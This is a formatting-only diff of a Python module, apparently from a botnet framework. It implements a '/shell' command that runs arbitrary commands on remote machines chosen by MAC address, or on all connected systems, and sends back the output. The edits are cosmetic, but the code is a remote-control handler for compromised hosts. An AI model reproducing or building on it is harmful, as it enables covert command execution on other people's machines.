@@ -11,16 +11,15 @@ from .. import BotNet, Request
 def shell(request: Request, *cmd_args) -> str:
     """
     `[mac-address] /shell` -> shell session
-    or 
+    or
     `[mac-address] /shell [command]`-> run command and exit
 
     example input command:
-         `94945035671481 /shell`  \n 
+         `94945035671481 /shell`  \n
          `94945035671481 /shell ls .`\n
          `94945035671481 /shell ping google.com -c 10`
         or
-         `/shell ping google.com -c 10` -> run command in all systems
-"""
+         `/shell ping google.com -c 10` -> run command in all systems"""
     engine = request.engine
 
     if not len(cmd_args) == 0:
@@ -73,12 +72,12 @@ def _valid_command(command) -> bool:
     return True
 
 
-def _ls(command:list[str]) -> str:
+def _ls(command: list[str]) -> str:
     if len(command) >= 2:
         path = command[1]
     else:
-        path = '.'
-        
+        path = "."
+
     try:
         return os.listdir(path)
 
@@ -87,12 +86,13 @@ def _ls(command:list[str]) -> str:
     except Exception as error:
         return error
 
-def _cd(command:list[str]) -> str:
+
+def _cd(command: list[str]) -> str:
     if len(command) >= 2:
-            path = command[1]
+        path = command[1]
     else:
-        path = ' '
-    
+        path = " "
+
     try:
         os.chdir(path)
         return None
@@ -103,7 +103,7 @@ def _cd(command:list[str]) -> str:
         return error
 
 
-def _cmd(command:list[str], engine, timeout:int=10):
+def _cmd(command: list[str], engine, timeout: int = 10):
     """Run commands."""
 
     if command[0] in ("ls", "dir"):
@@ -126,11 +126,11 @@ def _cmd(command:list[str], engine, timeout:int=10):
                 continue
             else:
                 return None
-        
-        return "Your command is running in the background and you will get the results when it is done."
-        
 
-def _runcommand_in_thread(command:list[str], engine):
+        return "Your command is running in the background and you will get the results when it is done."
+
+
+def _runcommand_in_thread(command: list[str], engine):
     try:
         result = subprocess.getoutput(" ".join(command))
         if type(result) == bytes:
@@ -139,4 +139,3 @@ def _runcommand_in_thread(command:list[str], engine):
 
     except Exception as e:
         engine.send(e)
-        
